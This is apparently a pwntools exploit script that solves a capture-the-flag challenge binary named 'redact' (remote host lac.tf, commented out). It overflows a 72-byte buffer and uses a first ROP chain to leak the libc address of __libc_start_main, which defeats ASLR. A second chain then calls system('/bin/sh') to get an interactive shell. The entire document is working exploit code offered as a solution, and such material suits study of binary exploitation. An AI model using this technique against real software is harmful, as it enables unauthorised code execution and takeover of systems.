from pwn import * # type: ignore

exe = ELF("./redact")
libc = ELF("./libc.so.6")

context.binary = exe

r = process([exe.path])
# r = remote("lac.tf", 31181)

rop1 = ROP(exe, badchars=b"\n")
rop1.call("_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc", (exe.symbols["_ZSt4cout"], exe.got.__libc_start_main)) # type: ignore
rop1.raw(rop1.find_gadget(["ret"]))
rop1.main() # type: ignore
log.info(rop1.dump())

r.sendlineafter(b"text: ", b"")
r.sendlineafter(b"placeholder: ", rop1.generatePadding(0, 72) + rop1.chain()) # type: ignore
r.sendlineafter(b"redact: ", b"0")
r.recvline()
leak = unpack(r.recvuntil(b"Enter", drop=True).ljust(8, b"\0"))
log.info(f"{hex(leak)=}")
libc.address = leak - libc.symbols.__libc_start_main # type: ignore
log.info(f"{hex(libc.address)}")  # type: ignore

rop2 = ROP([exe, libc], badchars=b'\n')
rop2.raw(0x401016) # The 'ret' gadget for 16-byte alignment
rop2.system(next(libc.search(b"/bin/sh"))) # type: ignore

# r.sendlineafter(b"text: ", b"")
r.sendlineafter(b"placeholder: ", b"A"*72 + rop2.chain())
r.sendlineafter(b"redact: ", b"0")

r.interactive()
